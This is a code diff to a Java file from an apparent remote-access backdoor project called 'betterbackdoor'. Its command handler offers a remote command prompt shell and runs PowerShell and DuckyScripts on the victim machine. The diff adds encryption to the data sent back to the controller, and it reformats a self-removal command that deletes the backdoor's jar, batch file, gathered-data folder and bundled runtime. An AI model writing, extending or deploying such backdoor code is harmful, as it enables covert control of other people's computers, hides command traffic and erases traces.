@@ -7,10 +7,15 @@ import java.awt.datatransfer.DataFlavor;
 import java.io.File;
 import java.io.IOException;
 import java.io.PrintWriter;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
 import java.util.ArrayList;
 import java.util.Arrays;
 import java.util.Scanner;
 
+import javax.crypto.BadPaddingException;
+import javax.crypto.IllegalBlockSizeException;
+import javax.crypto.NoSuchPaddingException;
 import javax.imageio.ImageIO;
 
 import dev.thatcherclough.betterbackdoor.backend.DuckyScripts;
@@ -30,7 +35,8 @@ public class HandleCommand {
 	 *
 	 * @param command command given to the backdoor
 	 */
-	public static void handle(String command) throws IOException {
+	public static void handle(String command) throws IOException, IllegalBlockSizeException, InvalidKeyException, BadPaddingException, NoSuchAlgorithmException,
+			NoSuchPaddingException {
 		StringBuilder send = new StringBuilder();
 		if (command.equals("help"))
 			send = new StringBuilder("[cmd] Open a command prompt shell\n[ps] Run a PowerShell script\n[ds] Run a DuckyScript\n"
@@ -229,7 +235,7 @@ public class HandleCommand {
 			}
 		else if (command.equals("remove"))
 			try {
-				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && cd "+System.getProperty("user.dir")+" && del /f /q run.jar run.bat && rd /s /q "
+				Runtime.getRuntime().exec("cmd /c ping localhost -n 5 > nul && cd " + System.getProperty("user.dir") + " && del /f /q run.jar run.bat && rd /s /q "
 						+ Backdoor.gatheredDir + " jre");
 				System.exit(0);
 			} catch (Exception e) {
@@ -239,7 +245,12 @@ public class HandleCommand {
 			}
 		else if (!command.isEmpty())
 			send = new StringBuilder("Command not found");
-		Backdoor.out.writeObject(send.toString());
+
+		if (Backdoor.key != null)
+			Backdoor.out.writeObject(Utils.encrypt(send.toString(), Backdoor.key));
+		else
+			Backdoor.out.writeObject(send.toString());
+
 		Backdoor.out.flush();
 	}
 
